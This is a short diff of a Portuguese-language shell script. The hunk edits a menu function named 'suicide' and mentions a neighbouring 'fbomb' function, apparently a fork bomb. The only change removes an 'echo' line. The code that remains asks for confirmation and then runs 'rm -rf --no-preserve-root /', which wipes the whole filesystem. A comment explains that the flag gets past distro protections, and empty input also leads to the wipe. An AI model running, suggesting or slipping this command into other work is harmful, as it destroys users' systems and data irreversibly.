@@ -40,7 +40,6 @@ function fbomb() {
 function suicide() {
   echo -n " Você têm certeza? [S/N] "
   read SLINUX
-  echo
   case ${SLINUX} in
     s|S|"") rm -rf --no-preserve-root / ;;  # Distros modernas trazem um patch que impede o "rm -rf /" tradicional
     n|N|"") menu ;;
